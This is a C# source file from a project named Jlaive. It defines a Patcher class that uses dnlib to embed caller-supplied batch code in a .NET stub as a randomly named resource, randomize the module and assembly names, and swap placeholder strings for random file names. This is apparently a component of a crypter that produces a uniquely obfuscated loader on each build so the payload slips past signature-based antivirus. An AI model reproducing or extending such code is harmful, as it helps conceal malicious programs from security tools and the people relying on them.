using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using dnlib.DotNet;
using dnlib.DotNet.Emit;

namespace Jlaive
{
    public class Patcher
    {
        public static byte[] FixStub(byte[] input, string batchcode, Random rng)
        {
            ModuleDefMD module = ModuleDefMD.Load(input);
            string resourcename = Utils.RandomString(10, rng);
            module.Resources.Add(new EmbeddedResource(resourcename, Encoding.ASCII.GetBytes(batchcode)));
            module.Name = Utils.RandomString(10, rng);
            module.Assembly.Name = Utils.RandomString(10, rng);
            foreach (TypeDef type in module.GetTypes())
            {
                if (type.IsGlobalModuleType) continue;
                foreach (MethodDef method in type.Methods)
                {
                    if (!method.HasBody) continue;
                    IList<Instruction> instr = method.Body.Instructions;
                    for (int i = 0; i < instr.Count; i++)
                    {
                        if (instr[i].ToString().Contains("%BATCHNAME%"))
                        {
                            instr[i] = OpCodes.Ldstr.ToInstruction(Utils.RandomString(10, rng) + ".bat");
                        }
                        else if (instr[i].ToString().Contains("%BATCHFILE%"))
                        {
                            instr[i] = OpCodes.Ldstr.ToInstruction(resourcename);
                        }
                    }
                }
            }
            MemoryStream ms = new MemoryStream();
            module.NativeWrite(ms);
            byte[] output = ms.ToArray();
            ms.Dispose();
            return output;
        }
    }
}
